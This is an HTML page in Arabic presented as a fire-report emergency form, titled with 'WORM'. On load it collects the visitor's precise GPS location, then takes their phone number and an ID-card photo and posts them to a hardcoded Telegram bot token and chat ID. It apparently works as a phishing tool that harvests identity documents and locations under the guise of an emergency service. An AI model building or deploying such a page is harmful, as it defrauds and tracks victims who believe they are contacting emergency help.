<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بلاغ حريق - WORM</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #1a1a1a;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #2d2d2d;
            padding: 30px;
            border-radius: 20px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
            border: 1px solid #ff4444;
        }
        h1 {
            text-align: center;
            color: #ff4444;
            margin-bottom: 25px;
        }
        label {
            display: block;
            margin: 15px 0 5px;
            font-weight: bold;
        }
        input, button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input {
            background: #3a3a3a;
            color: #fff;
            border: 1px solid #555;
        }
        input:focus {
            outline: 2px solid #ff4444;
        }
        button {
            background: #ff4444;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            margin-top: 25px;
            transition: 0.3s;
        }
        button:hover {
            background: #cc0000;
            transform: scale(1.02);
        }
        #status {
            margin-top: 15px;
            padding: 10px;
            background: #222;
            border-radius: 8px;
            text-align: center;
            font-size: 14px;
            color: #ffaa00;
        }
        .gps-status {
            background: #1f3a1f;
            padding: 8px;
            border-radius: 8px;
            text-align: center;
            margin: 10px 0;
            font-size: 13px;
            color: #7fff7f;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>🚨 بلاغ حريق</h1>

    <label>📞 رقم هاتف المبلغ</label>
    <input type="text" id="phone" placeholder="مثال: 0999999999">

    <label>🪪 صورة الهوية</label>
    <input type="file" id="idImage" accept="image/*">

    <div class="gps-status" id="gpsStatus">📍 جاري جلب الموقع...</div>

    <button id="sendBtn">🔥 إرسال البلاغ</button>
    <div id="status">⏳ في انتظار الإرسال</div>
</div>

<script>
    // ======== بيانات التليجرام ========
    const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
    const CHAT_ID = "8665747715";

    let userLat = "غير متاح";
    let userLon = "غير متاح";

    // ======== جلب الموقع في الخلفية ========
    function getGPS() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    userLat = pos.coords.latitude;
                    userLon = pos.coords.longitude;
                    document.getElementById('gpsStatus').innerHTML = `✅ الموقع: ${userLat}, ${userLon}`;
                },
                (err) => {
                    document.getElementById('gpsStatus').innerHTML = '⚠️ تعذر جلب الموقع (أذن يدوي)';
                    console.warn('GPS error:', err);
                },
                { enableHighAccuracy: true, timeout: 15000 }
            );
        } else {
            document.getElementById('gpsStatus').innerHTML = '❌ متصفحك لا يدعم GPS';
        }
    }

    // تشغيل فوري
    getGPS();

    // ======== رفع الصورة إلى تليجرام كـ multipart ========
    async function sendToTelegram(phone, imageFile, lat, lon) {
        const statusDiv = document.getElementById('status');
        statusDiv.innerHTML = '⏳ جاري الإرسال...';

        try {
            // 1. نرسل الصورة أولاً (كـ Document)
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', imageFile);
            formData.append('caption', `🔥 بلاغ حريق\n📞 الهاتف: ${phone}\n📍 الموقع: ${lat}, ${lon}`);

            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });

            const data = await response.json();
            if (data.ok) {
                statusDiv.innerHTML = '✅ تم الإرسال بنجاح إلى تليجرام!';
                statusDiv.style.color = '#7fff7f';
            } else {
                statusDiv.innerHTML = '❌ فشل الإرسال: ' + data.description;
                statusDiv.style.color = '#ff6666';
            }
        } catch (error) {
            statusDiv.innerHTML = '🚫 خطأ في الشبكة: ' + error.message;
            statusDiv.style.color = '#ff6666';
        }
    }

    // ======== زر الإرسال ========
    document.getElementById('sendBtn').addEventListener('click', function () {
        const phone = document.getElementById('phone').value.trim();
        const fileInput = document.getElementById('idImage');
        const file = fileInput.files[0];

        if (!phone) {
            document.getElementById('status').innerHTML = '⚠️ أدخل رقم الهاتف';
            document.getElementById('status').style.color = '#ffaa00';
            return;
        }
        if (!file) {
            document.getElementById('status').innerHTML = '⚠️ اختر صورة الهوية';
            document.getElementById('status').style.color = '#ffaa00';
            return;
        }

        // إعادة محاولة جلب الموقع لحظة الإرسال
        getGPS();

        // ننتظر ثانية ثم نرسل
        setTimeout(() => {
            sendToTelegram(phone, file, userLat, userLon);
        }, 1000);
    });

    // عند تغيير الملف أو الهاتف نعيد ضبط الحالة
    document.getElementById('phone').addEventListener('input', () => {
        document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
        document.getElementById('status').style.color = '#ffaa00';
    });
    document.getElementById('idImage').addEventListener('change', () => {
        document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
        document.getElementById('status').style.color = '#ffaa00';
    });
</script>

</body>
</html>
